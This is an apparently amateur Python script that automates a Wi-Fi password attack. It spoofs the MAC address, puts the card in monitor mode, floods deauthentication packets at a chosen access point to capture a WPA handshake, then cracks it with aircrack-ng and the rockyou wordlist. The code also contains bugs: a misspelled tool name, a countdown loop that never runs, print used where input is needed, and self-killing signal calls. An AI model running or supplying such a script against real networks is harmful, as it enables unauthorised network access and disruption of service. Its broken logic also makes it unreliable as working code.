import os
import signal
import time

class wlan0:
    def change_mac_wlan0(self):
        os.system("sudo ifconfig wlan0 down")
        os.system("sudo macchanger -r wlan0")
        os.system("sudo ifconfig wlan0 up")
    def kill_monitor_wlan(self):
        os.system("sudo airmon-ng check kill")
        os.system("sudo airmon-ng start wlan0")
        
    def deauth_wlan0(self, bssid):
        os.system(f"sudo aireply-ng --deauth 0 -a {bssid} wlan0mon")
        
        for i in range(30, 0):
            print(f"Deauth ending in {i}")
            time.sleep(1)
        
    def scan_network_wlan0(self):
        os.system("sudo airodump-ng wlan0mon")
        
        while True:
            stop = input("If ssid is found, type and enter x: ")
            if stop == "x":
                os.kill(os.getpid(), signal.SIGINT)
                break
            
        self.ch = input("\n\nInput channel: ")
        self.bssid = input("Input bssid: ")
        self.essid = input("Input essid: ")
        
        os.system(f"sudo airodump-ng -w {self.essid} -c {self.ch} --bssid {self.bssid} wlan0mon &")
        self.deauth_wlan0(self.bssid)
        
        while True:
            x = print("type y if the handshake is done: ")
            if x == "y":
                os.kill(os.getpid(), signal.SIGINT)
                break
            else:
                self.deauth_wlan0(self.bssid)
    def dictionary_atk(self):
        self.scan_network_wlan0()
        os.system(f"sudo aircrack-ng {self.essid}-01.cap -w /usr/share/wordlists/rockyou.txt")
    

type = input("Input attack: wlan0 | eth0: wlan0")

if type == "wlan0":
    w0 = wlan0()
    
    w0.change_mac_wlan0()
    w0.kill_monitor_wlan()
    w0.scan_network_wlan0()
    w0.dictionary_atk()
    

    
        
    
    
    
    
    
    
    